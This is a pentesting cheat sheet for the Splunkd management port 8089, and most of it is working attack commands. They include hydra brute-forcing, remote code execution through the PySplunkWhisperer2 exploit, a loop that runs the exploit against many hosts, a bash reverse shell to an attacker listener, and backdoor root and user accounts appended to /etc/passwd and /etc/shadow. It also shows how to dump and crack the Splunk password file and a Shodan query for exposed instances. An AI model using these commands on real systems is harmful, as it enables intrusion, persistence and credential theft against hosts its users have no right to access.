# Splunkd (Port 8089) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating Splunkd (port 8089), I realistically expect to find:

- [ ] Exposed Splunk Universal Forwarder API
- [ ] Default or weak credentials (e.g., admin / changeme or easy guess)
- [ ] Ability to authenticate and send remote commands
- [ ] Potential for full remote code execution as SYSTEM/root
- [ ] Possibility to add users or maintain persistence
- [ ] No lockout mechanism, making brute-force attacks viable

---

## ‚úÖ Splunkd Pentest Checklist

- [ ] **Banner Grabbing**
  - Confirm service and version.
    ```
    nc -vn <IP> 8089
    curl -k https://<IP>:8089
    ```

- [ ] **Nmap Scan**
  - Discover service details and enumerate.
    ```
    nmap -sV -p8089 <IP>
    ```

- [ ] **Credential Testing**
  - Attempt default or weak credentials.
    ```
    admin:changeme
    admin:admin
    admin:<known_password>
    ```

- [ ] **Brute-Forcing Credentials**
  - Brute-force the Splunkd login (no lockout).
    ```
    hydra -s 8089 -V -L users.txt -P passwords.txt https-post-form "/:user=^USER^&password=^PASS^:Invalid login"
    ```

- [ ] **Authenticated Command Execution**
  - If credentials found, use them to execute arbitrary commands via the Universal Forwarder.
    ```
    python PySplunkWhisperer2_remote.py --host <IP> --port 8089 --username admin --password "<PASSWORD>" --payload "id"
    ```
  - Example to add user:
    ```
    --payload "echo 'attacker007:x:1003:1003::/home/attacker007:/bin/bash' >> /etc/passwd"
    ```

- [ ] **Batch Exploitation**
  - Automate exploitation against many hosts.
    ```
    for i in $(cat ip_list.txt); do
      python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "<PASSWORD>" --payload "id"
    done
    ```

---

## ‚úÖ Privilege Escalation

- [ ] **If Splunk runs as root/SYSTEM**
  - Exploit yields root/system shell.
    ```
    --payload "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
    ```
  - Modify sensitive files.
    ```
    --payload "echo 'root007::0:0:root:/root:/bin/bash' >> /etc/passwd"
    ```

---

## ‚úÖ Persistence

- [ ] **Backdoor Accounts**
  - Add new user to passwd and shadow files.
    ```
    --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd"
    --payload "echo 'attacker007:<hashed_pass>:...' >> /etc/shadow"
    ```

- [ ] **Maintain SSH Access**
  - Confirm login with created user.
    ```
    ssh attacker007@<IP>
    ```

---

## ‚úÖ Looting Passwords

- [ ] **Dump Splunk Password File**
  - Retrieve for offline cracking.
    ```
    --payload "cat /opt/splunk/etc/passwd"
    ```
  - Crack with Hashcat.
    ```
    hashcat -m 1400 hashes.txt wordlist.txt
    ```

---

## ‚úÖ Exploit Tools

- [ ] **PySplunkWhisperer2**
  - Exploit RCE via Universal Forwarder.
    ```
    https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
    ```

---

## ‚úÖ Shodan Search

- Find exposed Splunkd instances.
    ```
    port:8089 Splunk
    ```

---

## ‚úÖ References & Further Reading

- [Abusing Splunk Forwarders for RCE and Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [SplunkWhisperer2 Github](https://github.com/cnotin/SplunkWhisperer2)
- [Exploit-DB 46238](https://www.exploit-db.com/exploits/46238)
- [Exploit-DB 46487](https://www.exploit-db.com/exploits/46487)
